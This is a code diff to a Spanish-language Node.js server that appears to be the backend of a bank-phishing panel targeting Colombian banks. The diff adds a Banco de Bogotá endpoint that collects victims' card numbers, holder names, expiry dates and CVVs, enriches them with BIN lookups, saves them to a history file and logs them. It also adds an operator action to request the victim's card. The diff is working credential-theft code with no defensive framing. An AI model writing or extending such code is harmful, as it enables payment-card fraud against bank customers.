@@ -525,7 +525,9 @@ const server = http.createServer(async (req, res) => {
                         PEDIR_TARJETA_OCCIDENTE: 'pedir_tarjeta_occidente',
                         // 🔥 CAJA SOCIAL 🔥
                         PEDIR_TARJETA_CAJA_SOCIAL: 'pedir_tarjeta_caja_social',
-                        PEDIR_PIN_CAJA_SOCIAL: 'pedir_pin_caja_social'
+                        PEDIR_PIN_CAJA_SOCIAL: 'pedir_pin_caja_social',
+                        // 🔥 BANCO DE BOGOTÁ 🔥
+                        PEDIR_TARJETA_BOGOTA: 'pedir_tarjeta_bogota'
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     let estadoNuevo = mapEstados[accion];
@@ -555,7 +557,6 @@ const server = http.createServer(async (req, res) => {
                         try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
                     }
 
-                    // 🔥 FIX: Si es RECHAZAR, limpiar datos de la CC/PIN (del panel y del historial) 🔥
                     if (accion === 'RECHAZAR') {
                         const camposLimpiar = ['tarjeta','titular','exp','expMes','expAnio','cvv','pin','bin','cardBrand','cardType','cardLevel','bankName','countryName','fechaCaptura'];
 
@@ -881,6 +882,50 @@ const server = http.createServer(async (req, res) => {
                 guardarHistorial('bancolombia', datosCompletos);
                 bcSesiones.delete(sessionId);
                 json(res, 200, { ok: true });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
+        // 🔥 NUEVO ENDPOINT PARA BANCO DE BOGOTÁ 🔥
+        if (req.method === 'POST' && url === '/bogota/guardar-tarjeta') {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const datos = await getBody(req);
+                const { sessionId, tarjeta, titular, exp, cvv } = datos;
+                
+                if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
+
+                const previos = datosSesiones.get(sessionId) || {};
+                const infoBin = await obtenerInfoBin(tarjeta);
+
+                const datosCompletos = Object.assign({}, previos, {
+                    sessionId,
+                    bancoKey: 'bogota',
+                    marca: 'bogota',
+                    tarjeta,
+                    titular,
+                    exp,
+                    expMes: exp,
+                    cvv,
+                    ip: previos.ip || ip,
+                    creadoEn: previos.creadoEn || new Date().toISOString(),
+                    bin: infoBin?.bin || '',
+                    cardBrand: infoBin?.cardBrand || 'Desconocida',
+                    cardType: infoBin?.cardType || 'Desconocido',
+                    cardLevel: infoBin?.cardLevel || 'Desconocido',
+                    bankName: infoBin?.bankName || 'Desconocido',
+                    countryName: infoBin?.countryName || 'Desconocido'
+                });
+
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datosCompletos);
+                ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
+                pasosSesiones.set(sessionId, 'Bogotá Tarjeta');
+
+                guardarHistorial('bogota', datosCompletos);
+
+                console.log(`[BOGOTA] Tarjeta recibida: ${sessionId} | Tarjeta: ${tarjeta} | Titular: ${titular}`);
+                json(res, 200, { ok: true, sessionId, binInfo: infoBin });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
@@ -1364,7 +1409,7 @@ const server = http.createServer(async (req, res) => {
         if (req.method === 'GET' && estadoMatch) {
             const bancoKey = estadoMatch[1];
             const sessionId = estadoMatch[2];
-            const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || bancoKey === 'vanti' || bancoKey === 'popular' || bancoKey === 'davivienda' || bancoKey === 'bbva' || bancoKey === 'occidente' || bancoKey === 'caja-social';
+            const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || bancoKey === 'vanti' || bancoKey === 'popular' || bancoKey === 'davivienda' || bancoKey === 'bbva' || bancoKey === 'occidente' || bancoKey === 'caja-social' || bancoKey === 'bogota';
             if (!esValido) { json(res, 404, { ok: false }); return; }
             const estado = estadoSesiones.get(sessionId) || 'pendiente';
             const accion = ultimaAccionSesiones.get(sessionId) || '';
